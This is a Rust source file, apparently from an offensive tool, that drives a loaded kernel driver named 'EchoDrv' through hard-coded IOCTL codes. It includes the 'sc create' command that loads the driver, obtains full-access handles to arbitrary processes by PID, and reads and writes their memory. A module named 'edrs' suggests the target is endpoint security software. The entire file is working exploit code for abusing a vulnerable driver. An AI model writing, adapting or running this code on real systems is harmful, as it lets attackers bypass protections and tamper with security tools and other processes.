use crate::Utils;

pub mod edrs;

use log::error;
use std::alloc::dealloc;
use std::alloc::{alloc, Layout};
use std::io::Error;
use std::os::raw::c_void;
use std::ptr;
use std::ptr::null_mut;

use windows_sys::Win32::System::Threading::GetCurrentProcessId;
use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;
use windows_sys::Win32::Foundation::{GENERIC_READ, GENERIC_WRITE};
use windows_sys::Win32::Storage::FileSystem::CreateFileW;
use windows_sys::Win32::Storage::FileSystem::OPEN_EXISTING;
use windows_sys::Win32::Storage::FileSystem::{FILE_SHARE_READ, FILE_SHARE_WRITE};

use windows_sys::Win32::Foundation::HANDLE;

use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::IO::DeviceIoControl;

#[repr(C)]
#[derive(Copy, Clone)]
struct k_get_handle {
    pid: u32,
    access: u32,
    handle: HANDLE,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct k_param_readmem {
    target_process: HANDLE,
    from_address: *mut c_void,
    to_address: *mut c_void,
    length: u64,
    padding: *mut c_void,
    return_code: u32,
}

pub struct Driver;

impl Driver {
    pub unsafe fn load() -> HANDLE {
        // IOCTL Code - 0x9e6a0594

        // sc create EchoDrv binpath=C:\PathToDriver.sys type= kernel && sc start EchoDrv
        let handle_driver = CreateFileW(
            Utils::convert_string_to_mut_u16("\\\\.\\EchoDrv".to_string()),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            0,
            0,
        );

        if handle_driver == INVALID_HANDLE_VALUE {
            error!("Failed to load driver");
            return 0;
        }

        let size = 4096;
        let layout = Layout::from_size_align(size, std::mem::align_of::<u8>()).unwrap();

        // Allocate memory on the heap and obtain a raw pointer to it
        let buf: *mut u8 = unsafe { alloc(layout) as *mut u8 };

        if DeviceIoControl(
            handle_driver,
            0x9e6a0594,
            null_mut(),
            0,
            buf as *mut c_void,
            4096,
            null_mut(),
            null_mut(),
        ) == 0
        {
            error!(
                "Calling driver with: 0x9e6a0594 failed\n{}",
                Error::last_os_error()
            );
            CloseHandle(handle_driver);

            return 0;
        }

        // Free the buffer
        unsafe { dealloc(buf as *mut _, layout) };
        handle_driver
    }

    pub unsafe fn get_handle_pid(handle_driver: HANDLE, pid: u32) -> HANDLE {
        // IOCTL Code - 0xe6224248

        let mut param: k_get_handle = std::mem::zeroed();

        param.pid = pid;
        param.access = 0x10000000; // GENERIC_ALL

        if DeviceIoControl(
            handle_driver,
            0xe6224248,
            &mut param as *const _ as *const c_void,
            std::mem::size_of::<k_get_handle>() as u32,
            &mut param as *mut _ as *mut c_void,
            std::mem::size_of::<k_get_handle>() as u32,
            null_mut(),
            null_mut(),
        ) == 0
        {
            error!(
                "Calling driver with: 0xe6224248 failed\n{}",
                Error::last_os_error()
            );
            CloseHandle(handle_driver);
            return 0;
        }

        param.handle
    }

    pub unsafe fn memory(
        handle_driver: HANDLE,
        address: u64,
        buffer: &mut u64,
        len: u64,
        target_process: HANDLE,
    ) -> bool {
        let mut request: k_param_readmem = std::mem::zeroed();

        request.from_address = address as *mut c_void;
        request.length = len;
        request.target_process = target_process;
        request.to_address = buffer as *mut _ as *mut c_void;

        if DeviceIoControl(
            handle_driver,
            0x60a26124,
            &mut request as *const _ as *const c_void,
            std::mem::size_of::<k_param_readmem>() as u32,
            &mut request as *mut _ as *mut c_void,
            std::mem::size_of::<k_param_readmem>() as u32,
            ptr::null_mut(),
            ptr::null_mut(),
        ) == 0
        {
            error!(
                "Calling driver with: 0x60a26124 failed\n{}",
                Error::last_os_error()
            );
            CloseHandle(handle_driver);
            std::process::exit(0x100);
        }

        true
    }

    pub unsafe fn memory_write(
        handle_driver: HANDLE,
        address: u64,
        buffer: &mut u64,
        len: u64,
        target_process: HANDLE,
    ) -> bool {
        let mut request: k_param_readmem = std::mem::zeroed();

        request.from_address = buffer as *mut _ as *mut c_void;
        request.length = len;
        request.target_process = target_process;
        request.to_address = address as *mut c_void;

        if DeviceIoControl(
            handle_driver,
            0x60a26124,
            &mut request as *const _ as *const c_void,
            std::mem::size_of::<k_param_readmem>() as u32,
            &mut request as *mut _ as *mut c_void,
            std::mem::size_of::<k_param_readmem>() as u32,
            ptr::null_mut(),
            ptr::null_mut(),
        ) == 0
        {
            error!(
                "Calling driver with: 0x60a26124 failed\n{}",
                Error::last_os_error()
            );
            CloseHandle(handle_driver);
            std::process::exit(0x100);
        }

        true
    }

    pub unsafe fn shutdown(handle_driver: HANDLE) {
        CloseHandle(handle_driver);
    }
}
